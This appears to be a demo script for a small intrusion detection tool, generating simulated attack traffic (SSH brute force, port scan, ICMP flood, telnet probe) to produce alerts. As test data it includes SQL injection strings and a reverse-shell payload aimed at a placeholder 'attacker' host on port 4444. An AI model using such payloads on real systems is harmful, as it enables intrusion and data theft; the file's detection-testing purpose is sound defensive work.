import os
import random
import time

from rules import parse_rules
from detector import Detector, PacketInfo
from alerting import AlertManager


def main():
    if os.path.exists("alerts.log"):
        os.remove("alerts.log")
    if os.path.exists("blocklist.txt"):
        os.remove("blocklist.txt")

    rules = parse_rules("rules.txt")
    mgr = AlertManager(log_path="alerts.log", dry_run=True)
    detector = Detector(rules, on_alert=mgr.handle)

    random.seed(7)
    t = time.time() - 3600
    scenarios = []

    attacker1 = "203.0.113.10"
    for i in range(6):
        scenarios.append((t + i, PacketInfo(attacker1, "192.168.1.10", "TCP", 22, timestamp=t + i)))
    t += 120

    attacker2 = "198.51.100.23"
    for i, port in enumerate(random.sample(range(1, 2000), 18)):
        scenarios.append((t + i * 0.1, PacketInfo(attacker2, "192.168.1.10", "TCP", port, timestamp=t + i * 0.1)))
    t += 300

    attacker3 = "192.0.2.55"
    payloads = ["id=1 UNION SELECT user,pass FROM accounts", "' OR 1=1 --", "id=5 union select null,null"]
    for i in range(4):
        scenarios.append((t + i * 5, PacketInfo(attacker3, "192.168.1.20", "TCP", 80,
                                                  payload_text=random.choice(payloads), timestamp=t + i * 5)))
    t += 200

    attacker4 = "203.0.113.77"
    for i in range(24):
        scenarios.append((t + i * 0.05, PacketInfo(attacker4, "192.168.1.10", "ICMP", None, timestamp=t + i * 0.05)))
    t += 150

    attacker5 = "192.168.1.55"
    scenarios.append((t, PacketInfo(attacker5, "192.168.1.5", "TCP", 23, timestamp=t)))
    t += 60

    attacker6 = "192.0.2.99"
    scenarios.append((t, PacketInfo(attacker6, "192.168.1.20", "TCP", 4444,
                                     payload_text="bash -i >& /dev/tcp/attacker/4444 0>&1; /bin/sh",
                                     timestamp=t)))

    scenarios.sort(key=lambda s: s[0])
    for _, pkt in scenarios:
        detector.process(pkt)

    print("Demo traffic processed. Generated alerts.log for dashboard.py to visualize.")


if __name__ == "__main__":
    main()